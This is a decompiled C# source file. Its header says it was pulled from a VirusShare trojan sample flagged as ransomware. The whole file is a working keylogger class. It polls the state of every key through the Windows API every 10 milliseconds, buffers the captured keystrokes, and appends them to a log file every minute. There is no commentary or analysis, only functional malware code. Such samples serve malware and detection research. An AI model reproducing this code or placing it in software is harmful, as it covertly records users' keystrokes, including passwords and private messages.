// Decompiled with JetBrains decompiler
// Type: flu.KeyLogger
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b0697b8bc5c1f3bc7f21ce5b4482619e916e2da4.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;

namespace flu
{
  public class KeyLogger
  {
    private string keybuffer;
    private System.Timers.Timer CheckKey;
    private System.Timers.Timer FlushBuffer;
    private string file;

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(Keys vKey);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    public bool Enabled
    {
      get => this.CheckKey.Enabled && this.FlushBuffer.Enabled;
      set
      {
        this.CheckKey.Enabled = value;
        this.FlushBuffer.Enabled = value;
      }
    }

    public double FlushInterval
    {
      get => this.FlushBuffer.Interval;
      set => this.FlushBuffer.Interval = value;
    }

    public double CheckInterval
    {
      get => this.CheckKey.Interval;
      set => this.CheckKey.Interval = value;
    }

    public string File
    {
      get => this.file;
      set => this.file = value;
    }

    public KeyLogger(string filename)
    {
      this.keybuffer = string.Empty;
      this.File = filename;
      this.CheckKey = new System.Timers.Timer();
      this.CheckKey.Enabled = true;
      this.CheckKey.Elapsed += new ElapsedEventHandler(this.CheckKey_Elapsed);
      this.CheckKey.Interval = 10.0;
      this.FlushBuffer = new System.Timers.Timer();
      this.FlushBuffer.Enabled = true;
      this.FlushBuffer.Elapsed += new ElapsedEventHandler(this.FlushBuffer_Elapsed);
      this.FlushBuffer.Interval = 60000.0;
    }

    private void CheckKey_Elapsed(object sender, ElapsedEventArgs e)
    {
      foreach (int vKey in Enum.GetValues(typeof (Keys)))
      {
        if (KeyLogger.GetAsyncKeyState(vKey) == (short) -32767)
        {
          KeyLogger keyLogger = this;
          keyLogger.keybuffer = keyLogger.keybuffer + Enum.GetName(typeof (Keys), (object) vKey) + " ";
        }
      }
    }

    private void FlushBuffer_Elapsed(object sender, ElapsedEventArgs e) => this.Flush2File(this.file, true);

    public void Flush2File(string file, bool append)
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter(file, append);
        streamWriter.WriteLine(this.keybuffer + "\r\n");
        streamWriter.Close();
        this.keybuffer = string.Empty;
      }
      catch (Exception ex)
      {
        throw ex;
      }
    }
  }
}
